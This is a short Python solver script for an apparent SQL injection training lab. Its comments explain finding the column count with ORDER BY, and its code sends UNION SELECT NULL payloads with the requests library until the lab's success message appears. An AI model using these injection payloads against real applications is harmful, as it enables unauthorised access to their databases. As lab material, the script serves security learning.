# To solve the lab, we need to determine how many columns are being returned with the filter_category query.
# To do that, we need to infer the amount of columns using a 'order by' clause then from there we can understand the number of columns that we need to union with
# In our case, if we do ' order by 1 --; The application does not return an error,
# The case is the same for order by 2 and 3. However, once we pass 3, we get an error. We can thus deduce that the query only returns three columns. 
# From there, we can complete the lab by providing this payload to the application, which is a union query that will return unino with the appropriate amount of columns;
# ' union select null, null, null --

import requests
from proxies import proxies
import json
from sqli_utils import sqli_count_columns

def solve(url: str, payload: str):
    r = requests.session()
    col_count = sqli_count_columns(r, url)

    payload = "'+union+select+"
    column_adder = "NULL"
    print("[~] Testing SQLi UNION clause")
    for i in range(0, col_count):
        if i > 0:
            payload += ',+'
        payload += column_adder
        print("[~] Currently testing following payload: " + payload)
        res = r.get(url + payload + "--", verify=False, proxies=proxies)
        if "Congratulations, you solved the lab!" in res.text:
            print("[+] Injected payload " + payload + "--")
            return True

    return False
